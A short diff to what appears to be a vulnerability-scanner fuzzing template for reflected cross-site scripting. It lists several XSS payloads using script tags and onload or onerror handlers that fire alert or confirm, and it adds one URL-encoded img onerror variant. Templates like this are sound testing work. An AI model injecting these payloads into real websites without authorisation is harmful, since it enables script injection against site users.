@@ -22,6 +22,7 @@ http:
         - "</script><script>alert({{first}})</script>"
         - "<body onload=alert({{first}})>"
         - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
+        - ""><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
 
     fuzzing:
       - part: query
